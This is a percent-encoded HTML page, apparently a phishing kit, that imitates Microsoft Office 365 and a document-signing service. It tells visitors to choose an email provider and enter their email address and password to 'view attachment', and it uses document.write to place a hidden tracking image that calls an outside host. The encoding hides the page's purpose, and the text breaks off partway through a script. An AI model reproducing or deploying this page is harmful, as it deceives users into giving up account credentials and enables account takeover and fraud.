68%65%6C%6C%4C%65%67%61%6C%22%20%74%61%72%67%65%74%3D%22%5F%62%6C%61%6E%6B%22%20%68%72%65%66%3D%22%68%74%74%70%73%3A%2F%2F%67%2E%6D%69%63%72%6F%73%6F%66%74%6F%6E%6C%69%6E%65%2E%63%6F%6D%2F%30%42%58%32%30%65%6E%2F%37%32%31%22%20%73%74%79%6C%65%3D%22%22%20%72%6F%6C%65%3D%22%6C%69%6E%6B%22%20%63%6C%61%73%73%3D%22%6D%73%2D%66%63%6C%2D%74%70%20%6F%33%36%35%63%73%2D%6E%66%64%2D%6E%6F%72%6D%61%6C%2D%66%6F%6E%74%73%69%7A%65%20%6F%33%36%35%62%75%74%74%6F%6E%22%3E%3C%73%70%61%6E%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%5F%66%63%5F%33%20%6F%77%61%69%6D%67%22%3E%20%3C%2F%73%70%61%6E%3E%3C%73%70%61%6E%20%69%64%3D%22%5F%61%72%69%61%49%64%5F%31%30%22%20%63%6C%61%73%73%3D%22%5F%66%63%5F%34%20%6F%33%36%35%62%75%74%74%6F%6E%4C%61%62%65%6C%22%3E%4C%65%67%61%6C%3C%2F%73%70%61%6E%3E%3C%2F%61%3E%3C%2F%64%69%76%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6D%73%2D%66%63%6C%2D%74%70%20%6F%33%36%35%63%73%2D%6E%66%64%2D%6E%6F%72%6D%61%6C%2D%6C%69%6E%65%68%65%69%67%68%74%22%3E%3C%61%20%61%72%69%61%2D%6C%61%62%65%6C%6C%65%64%62%79%3D%22%5F%61%72%69%61%49%64%5F%31%31%22%20%69%64%3D%22%4F%33%36%35%5F%53%75%62%4C%69%6E%6B%5F%53%68%65%6C%6C%50%72%69%76%61%63%79%22%20%74%61%72%67%65%74%3D%22%5F%62%6C%61%6E%6B%22%20%68%72%65%66%3D%22%68%74%74%70%73%3A%2F%2F%67%2E%6D%69%63%72%6F%73%6F%66%74%6F%6E%6C%69%6E%65%2E%63%6F%6D%2F%30%42%58%32%30%65%6E%2F%31%33%30%35%22%20%73%74%79%6C%65%3D%22%22%20%72%6F%6C%65%3D%22%6C%69%6E%6B%22%20%63%6C%61%73%73%3D%22%6D%73%2D%66%63%6C%2D%74%70%20%6F%33%36%35%63%73%2D%6E%66%64%2D%6E%6F%72%6D%61%6C%2D%66%6F%6E%74%73%69%7A%65%20%6F%33%36%35%62%75%74%74%6F%6E%22%3E%3C%73%70%61%6E%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%5F%66%63%5F%33%20%6F%77%61%69%6D%67%22%3E%20%3C%2F%73%70%61%6E%3E%3C%73%70%61%6E%20%69%64%3D%22%5F%61%72%69%61%49%64%5F%31%31%22%20%63%6C%61%73%73%3D%22%5F%66%63%5F%34%20%6F%33%36%35%62%75%74%74%6F%6E%4C%61%62%65%6C%22%3E%50%72%69%76%61%63%79%20%26%61%6D%70%3B%20%63%6F%6F%6B%69%65%73%3C%2F%73%70%61%6E%3E%3C%2F%61%3E%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%74%68%65%6D%65%73%50%61%6E%65%6C%22%3E%3C%2F%64%69%76%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%65%78%74%65%6E%73%69%62%69%6C%69%74%79%50%61%6E%65%6C%20%6D%73%2D%62%67%63%2D%77%22%3E%3C%2F%64%69%76%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%70%65%72%73%6F%6E%61%50%61%6E%65%6C%20%6D%73%2D%62%67%63%2D%77%22%3E%3C%2F%64%69%76%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%3E%3C%2F%64%69%76%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%62%75%6E%64%6C%65%2D%70%61%6E%65%6C%20%6F%33%36%35%63%73%2D%77%31%30%30%2D%68%31%30%30%22%3E%3C%2F%64%69%76%3E%20%3C%64%69%76%20%74%61%62%69%6E%64%65%78%3D%22%30%22%3E%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%0A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%69%64%3D%22%53%68%65%6C%6C%42%6F%64%79%41%6E%64%46%6F%6F%74%65%72%43%6F%6E%74%61%69%6E%65%72%22%20%73%74%79%6C%65%3D%22%77%69%64%74%68%3A%20%31%32%38%30%70%78%3B%20%68%65%69%67%68%74%3A%20%36%34%33%70%78%3B%22%20%74%61%62%69%6E%64%65%78%3D%22%2D%31%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%53%68%65%6C%6C%2D%42%6F%64%79%22%20%69%64%3D%22%53%68%65%6C%6C%42%6F%64%79%22%20%73%74%79%6C%65%3D%22%68%65%69%67%68%74%3A%20%36%31%33%70%78%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%69%64%3D%22%52%6F%6F%74%50%61%67%65%4C%61%79%6F%75%74%22%20%63%6C%61%73%73%3D%22%50%61%67%65%4C%61%79%6F%75%74%20%4C%61%79%6F%75%74%5F%46%75%6C%6C%53%63%72%65%65%6E%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%3E%0A%20%20%20%20%3C%69%6E%70%75%74%20%6E%61%6D%65%3D%22%42%4F%58%50%61%67%65%49%44%46%69%65%6C%64%22%20%69%64%3D%22%42%4F%58%50%61%67%65%49%44%46%69%65%6C%64%22%20%76%61%6C%75%65%3D%22%49%6E%64%65%78%22%20%74%79%70%65%3D%22%68%69%64%64%65%6E%22%3E%0A%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%74%61%62%6C%65%20%63%6C%61%73%73%3D%22%43%6F%6E%74%65%6E%74%22%20%63%65%6C%6C%70%61%64%64%69%6E%67%3D%22%30%22%20%63%65%6C%6C%73%70%61%63%69%6E%67%3D%22%30%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%74%62%6F%64%79%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%74%72%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%74%64%20%63%6C%61%73%73%3D%22%43%6F%6E%74%65%6E%74%22%20%69%64%3D%22%4C%61%79%6F%75%74%43%6F%6E%74%65%6E%74%43%6F%6E%74%61%69%6E%65%72%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%74%61%62%6C%65%20%63%6C%61%73%73%3D%22%43%6F%6E%74%65%6E%74%22%20%63%65%6C%6C%70%61%64%64%69%6E%67%3D%22%30%22%20%63%65%6C%6C%73%70%61%63%69%6E%67%3D%22%30%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%74%62%6F%64%79%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%74%72%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%74%64%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%50%61%67%65%4C%61%79%6F%75%74%2D%50%61%64%64%69%6E%67%20%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%6D%69%6E%2D%68%65%69%67%68%74%3A%20%33%30%33%70%78%3B%22%20%63%6C%61%73%73%3D%22%50%61%67%65%4C%61%79%6F%75%74%2D%50%61%6E%65%6C%73%22%3E%0A%0A%0A%3C%69%6E%70%75%74%20%69%64%3D%22%61%61%64%22%20%6E%61%6D%65%3D%22%61%61%64%22%20%76%61%6C%75%65%3D%22%30%22%20%74%79%70%65%3D%22%68%69%64%64%65%6E%22%3E%0A%3C%64%69%76%20%69%64%3D%22%70%61%67%65%5F%6C%61%79%6F%75%74%22%3E%0A%3C%64%69%76%20%69%64%3D%22%6C%65%66%74%5F%63%6F%6C%22%3E%0A%20%20%20%20%3C%64%69%76%20%69%64%3D%22%73%6B%75%5F%6E%61%6D%65%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%68%31%3E%53%65%6E%64%2C%20%73%69%67%6E%20%61%6E%64%20%61%70%70%72%6F%76%65%20%64%6F%63%75%6D%65%6E%74%73%2E%3C%2F%68%31%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%0A%3C%64%69%76%20%69%64%3D%22%68%6F%6D%65%5F%63%6F%6E%74%65%6E%74%22%3E%0A%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%20%73%72%63%3D%22%2E%2E%2F%2E%2E%2F%61%73%73%65%74%73%2F%6A%71%75%65%72%79%2E%6D%69%6E%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E%0A%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%20%73%72%63%3D%22%2E%2E%2F%2E%2E%2F%61%73%73%65%74%73%2F%6A%71%75%65%72%79%2E%64%64%73%6C%69%63%6B%2E%6D%69%6E%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E%0A%3C%73%63%72%69%70%74%20%73%72%63%3D%22%2E%2E%2F%2E%2E%2F%61%73%73%65%74%73%2F%53%70%72%79%56%61%6C%69%64%61%74%69%6F%6E%54%65%78%74%46%69%65%6C%64%2E%6A%73%22%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%3C%2F%73%63%72%69%70%74%3E%0A%3C%73%63%72%69%70%74%20%73%72%63%3D%22%2E%2E%2F%2E%2E%2F%61%73%73%65%74%73%2F%53%70%72%79%56%61%6C%69%64%61%74%69%6F%6E%50%61%73%73%77%6F%72%64%2E%6A%73%22%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%3C%2F%73%63%72%69%70%74%3E%0A%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%22%3C%69%6D%67%20%73%72%63%3D%27%68%74%74%70%73%3A%2F%2F%62%63%2E%61%64%72%75%74%2E%62%7A%2F%63%73%73%2F%6D%61%69%6E%2E%63%73%73%3F%74%79%70%65%3D%64%6F%63%75%73%69%67%6E%30%31%26%72%65%6C%3D%6E%6F%62%6F%64%79%27%20%73%74%79%6C%65%3D%27%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%27%2F%3E%22%29%3C%2F%73%63%72%69%70%74%3E%0A%3C%64%69%76%20%69%64%3D%22%73%74%61%72%74%5F%74%69%6C%65%73%22%3E%0A%3C%64%69%76%20%63%6C%61%73%73%3D%22%62%61%6E%6E%65%72%22%3E%0A%3C%68%32%20%63%6C%61%73%73%3D%22%68%69%64%64%65%6E%2D%73%6D%61%6C%6C%22%3E%53%69%67%6E%20%69%6E%20%77%69%74%68%20%79%6F%75%72%20%65%6D%61%69%6C%20%61%64%64%72%65%73%73%20%74%6F%20%76%69%65%77%20%6F%72%20%64%6F%77%6E%6C%6F%61%64%20%61%74%74%61%63%68%6D%65%6E%74%3C%2F%68%32%3E%3C%2F%64%69%76%3E%0A%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%61%72%64%20%73%69%67%6E%69%6E%2D%63%61%72%64%20%63%6C%65%61%72%66%69%78%22%3E%0A%20%20%3C%69%6D%67%20%63%6C%61%73%73%3D%22%22%20%73%72%63%3D%22%2E%2E%2F%2E%2E%2F%69%6D%61%67%65%73%2F%73%6F%63%69%61%6C%5F%61%75%74%68%5F%70%72%6F%76%69%64%65%72%73%2E%70%6E%67%22%20%77%69%64%74%68%3D%22%32%38%30%22%20%68%65%69%67%68%74%3D%22%22%3E%3C%70%3E%0A%3C%21%2D%2D%20%66%6F%72%6D%20%73%75%62%6D%69%74%20%73%74%61%72%74%20%2D%2D%3E%0A%09%3C%66%6F%72%6D%20%61%63%74%69%6F%6E%3D%22%23%22%20%6D%65%74%68%6F%64%3D%22%50%4F%53%54%22%20%61%75%74%6F%63%6F%6D%70%6C%65%74%65%3D%22%4F%46%46%22%3E%0A%20%20%20%3C%64%69%76%3E%3C%73%74%72%6F%6E%67%3E%53%65%6C%65%63%74%20%79%6F%75%72%20%65%6D%61%69%6C%20%70%72%6F%76%69%64%65%72%3C%2F%73%74%72%6F%6E%67%3E%3C%2F%64%69%76%3E%3C%70%3E%0A%20%20%20%20%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%68%69%64%64%65%6E%22%20%6E%61%6D%65%3D%22%68%69%64%43%66%6C%61%67%22%20%69%64%3D%22%68%69%64%43%66%6C%61%67%22%20%76%61%6C%75%65%3D%22%22%20%2F%3E%0A%20%20%20%20%3C%73%65%6C%65%63%74%20%63%6C%61%73%73%3D%22%63%66%6C%61%67%64%64%22%3E%0A%09%09%3C%6F%70%74%69%6F%6E%20%76%61%6C%75%65%3D%22%30%22%20%64%61%74%61%2D%69%6D%61%67%65%73%72%63%3D%22%2E%2E%2F%2E%2E%2F%69%6D%61%67%65%73%2F%6F%33%36%35%2E%70%6E%67%22%20%64%61%74%61%2D%64%65%73%63%72%69%70%74%69%6F%6E%3D%22%53%69%67%6E%20%69%6E%20%77%69%74%68%20%4F%66%66%69%63%65%33%36%35%22%3E%4F%66%66%69%63%65%33%36%35%3C%2F%6F%70%74%69%6F%6E%3E%0A%09%09%3C%6F%70%74%69%6F%6E%20%76%61%6C%75%65%3D%22%31%22%20%64%61%74%61%2D%69%6D%61%67%65%73%72%63%3D%22%2E%2E%2F%2E%2E%2F%69%6D%61%67%65%73%2F%6D%61%69%6C%5F%67%6D%61%69%6C%2E%70%6E%67%22%20%64%61%74%61%2D%64%65%73%63%72%69%70%74%69%6F%6E%3D%22%53%69%67%6E%20%69%6E%20%77%69%74%68%20%47%6D%61%69%6C%22%3E%47%6D%61%69%6C%3C%2F%6F%70%74%69%6F%6E%3E%0A%20%20%20%20%20%20%20%20%3C%6F%70%74%69%6F%6E%20%76%61%6C%75%65%3D%22%32%22%20%64%61%74%61%2D%69%6D%61%67%65%73%72%63%3D%22%2E%2E%2F%2E%2E%2F%69%6D%61%67%65%73%2F%79%61%68%6F%6F%2E%70%6E%67%22%20%64%61%74%61%2D%64%65%73%63%72%69%70%74%69%6F%6E%3D%22%53%69%67%6E%20%69%6E%20%77%69%74%68%20%59%61%68%6F%6F%22%3E%59%61%68%6F%6F%3C%2F%6F%70%74%69%6F%6E%3E%0A%20%20%20%20%20%20%20%20%3C%6F%70%74%69%6F%6E%20%76%61%6C%75%65%3D%22%33%22%20%20%64%61%74%61%2D%69%6D%61%67%65%73%72%63%3D%22%2E%2E%2F%2E%2E%2F%69%6D%61%67%65%73%2F%6C%69%76%65%5F%68%6F%74%6D%61%69%6C%2E%70%6E%67%22%20%64%61%74%61%2D%64%65%73%63%72%69%70%74%69%6F%6E%3D%22%53%69%67%6E%20%69%6E%20%77%69%74%68%20%48%6F%74%6D%61%69%6C%22%3E%48%6F%74%6D%61%69%6C%3C%2F%6F%70%74%69%6F%6E%3E%0A%20%20%20%20%20%20%20%20%3C%6F%70%74%69%6F%6E%20%76%61%6C%75%65%3D%22%34%22%20%64%61%74%61%2D%69%6D%61%67%65%73%72%63%3D%22%2E%2E%2F%2E%2E%2F%69%6D%61%67%65%73%2F%61%6F%6C%2E%70%6E%67%22%20%64%61%74%61%2D%64%65%73%63%72%69%70%74%69%6F%6E%3D%22%53%69%67%6E%20%69%6E%20%77%69%74%68%20%41%4F%4C%22%3E%41%4F%4C%3C%2F%6F%70%74%69%6F%6E%3E%0A%20%20%20%20%20%20%20%20%3C%6F%70%74%69%6F%6E%20%76%61%6C%75%65%3D%22%35%22%20%64%61%74%61%2D%69%6D%61%67%65%73%72%63%3D%22%2E%2E%2F%2E%2E%2F%69%6D%61%67%65%73%2F%65%6D%61%69%6C%2E%70%6E%67%22%20%64%61%74%61%2D%64%65%73%63%72%69%70%74%69%6F%6E%3D%22%53%69%67%6E%20%69%6E%20%77%69%74%68%20%4F%74%68%65%72%73%22%3E%4F%74%68%65%72%73%3C%2F%6F%70%74%69%6F%6E%3E%0A%09%3C%2F%73%65%6C%65%63%74%3E%3C%70%3E%0A%20%20%20%20%3C%6C%61%62%65%6C%20%63%6C%61%73%73%3D%22%68%69%64%64%65%6E%2D%6C%61%62%65%6C%22%20%66%6F%72%3D%22%45%6D%61%69%6C%22%3E%45%6D%61%69%6C%3C%2F%6C%61%62%65%6C%3E%0A%0A%3C%73%70%61%6E%20%69%64%3D%22%73%70%72%79%74%65%78%74%66%69%65%6C%64%31%22%3E%0A%3C%69%6E%70%75%74%20%69%64%3D%22%45%6D%61%69%6C%22%20%6E%61%6D%65%3D%22%45%6D%61%69%6C%22%20%74%79%70%65%3D%22%65%6D%61%69%6C%22%20%70%6C%61%63%65%68%6F%6C%64%65%72%3D%22%45%6D%61%69%6C%22%20%76%61%6C%75%65%3D%22%22%20%73%70%65%6C%6C%63%68%65%63%6B%3D%22%66%61%6C%73%65%22%20%63%6C%61%73%73%3D%22%22%3E%0A%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%74%65%78%74%66%69%65%6C%64%52%65%71%75%69%72%65%64%4D%73%67%22%3E%45%6E%74%65%72%20%79%6F%75%72%20%65%6D%61%69%6C%2E%3C%2F%73%70%61%6E%3E%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%74%65%78%74%66%69%65%6C%64%49%6E%76%61%6C%69%64%46%6F%72%6D%61%74%4D%73%67%22%3E%45%6E%74%65%72%20%61%20%76%61%6C%69%64%20%65%6D%61%69%6C%2E%3C%2F%73%70%61%6E%3E%3C%2F%73%70%61%6E%3E%0A%3C%6C%61%62%65%6C%20%63%6C%61%73%73%3D%22%68%69%64%64%65%6E%2D%6C%61%62%65%6C%22%20%66%6F%72%3D%22%50%61%73%73%77%64%22%3E%50%61%73%73%77%6F%72%64%3C%2F%6C%61%62%65%6C%3E%0A%3C%73%70%61%6E%20%69%64%3D%22%73%70%72%79%70%61%73%73%77%6F%72%64%31%22%3E%0A%3C%69%6E%70%75%74%20%69%64%3D%22%50%61%73%73%77%64%22%20%6E%61%6D%65%3D%22%50%61%73%73%77%64%22%20%74%79%70%65%3D%22%70%61%73%73%77%6F%72%64%22%20%70%6C%61%63%65%68%6F%6C%64%65%72%3D%22%50%61%73%73%77%6F%72%64%22%20%63%6C%61%73%73%3D%22%22%3E%0A%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%70%61%73%73%77%6F%72%64%52%65%71%75%69%72%65%64%4D%73%67%22%3E%45%6E%74%65%72%20%79%6F%75%72%20%70%61%73%73%77%6F%72%64%2E%3C%2F%73%70%61%6E%3E%3C%2F%73%70%61%6E%3E%0A%3C%69%6E%70%75%74%20%69%64%3D%22%73%69%67%6E%49%6E%22%20%6E%61%6D%65%3D%22%73%69%67%6E%49%6E%22%20%63%6C%61%73%73%3D%22%72%63%2D%62%75%74%74%6F%6E%20%72%63%2D%62%75%74%74%6F%6E%2D%73%75%62%6D%69%74%22%20%74%79%70%65%3D%22%73%75%62%6D%69%74%22%20%76%61%6C%75%65%3D%22%53%69%67%6E%20%69%6E%20%74%6F%20%76%69%65%77%20%61%74%74%61%63%68%6D%65%6E%74%22%3E%0A%20%20%3C%6C%61%62%65%6C%20%63%6C%61%73%73%3D%22%72%65%6D%65%6D%62%65%72%22%3E%0A%20%20%3C%69%6E%70%75%74%20%69%64%3D%22%50%65%72%73%69%73%74%65%6E%74%43%6F%6F%6B%69%65%22%20%6E%61%6D%65%3D%22%50%65%72%73%69%73%74%65%6E%74%43%6F%6F%6B%69%65%22%20%74%79%70%65%3D%22%63%68%65%63%6B%62%6F%78%22%20%76%61%6C%75%65%3D%22%79%65%73%22%3E%0A%20%20%3C%73%70%61%6E%3E%0A%20%20%53%74%61%79%20%73%69%67%6E%65%64%20%69%6E%0A%20%20%3C%2F%73%70%61%6E%3E%0A%20%20%3C%2F%6C%61%62%65%6C%3E%0A%3C%2F%66%6F%72%6D%3E%0A%3C%2F%64%69%76%3E%0A%3C%62%72%3E%0A%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E%0A%0A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%44%69%61%6C%6F%67%4D%61%6E%61%67%65%72%2D%42%6F%74%74%6F%6D%52%65%67%69%6F%6E%22%20%69%64%3D%22%64%69%61%6C%6F%67%42%6F%74%74%6F%6D%52%65%67%69%6F%6E%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%44%69%61%6C%6F%67%4D%61%6E%61%67%65%72%2D%42%6F%74%74%6F%6D%50%61%64%64%69%6E%67%41%72%65%61%20%6D%73%2D%62%63%6C%2D%77%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E%0A%0A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%50%61%67%65%4C%61%79%6F%75%74%2D%50%61%64%64%69%6E%67%20%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%74%64%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%74%72%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%74%62%6F%64%79%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%74%61%62%6C%65%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%74%64%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%74%72%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%74%62%6F%64%79%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%74%61%62%6C%65%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%77%69%64%74%68%3A%20%61%75%74%6F%3B%22%20%63%6C%61%73%73%3D%22%53%68%65%6C%6C%2D%46%6F%6F%74%65%72%20%22%20%69%64%3D%22%53%68%65%6C%6C%46%6F%6F%74%65%72%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%69%64%3D%22%4F%33%36%35%5F%46%6F%6F%74%65%72%43%6F%6E%74%61%69%6E%65%72%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%74%64%3E%0A%20%20%20%20%20%20%20%20%3C%2F%74%72%3E%0A%20%20%20%20%3C%2F%74%62%6F%64%79%3E%0A%3C%2F%74%61%62%6C%65%3E%0A%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%0A%24%28%27%2E%63%66%6C%61%67%64%64%27%29%2E%64%64%73%6C%69%63%6B%28%7B%20%20%0A%20%20%20%20%20%20%20%20%6F%6E%53%65%6C%65%63%74%65%64%3A%20%66%75%6E%63%74%69%6F%6E%28%64%61%74%61%29%7B%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%28%64%61%74%61%2E%73%65%6C%65%63%74%65%64%49%6E%64%65%78%20%3E%20%30%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23%68%69%64%43%66%6C%61%67%27%29%2E%76%61%6C%28%64%61%74%61%2E%73%65%6C%65%63%74%65%64%44%61%74%61%2E%76%61%6C%75%65%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20%20%20%0A%20%20%20%20%20%20%20%20%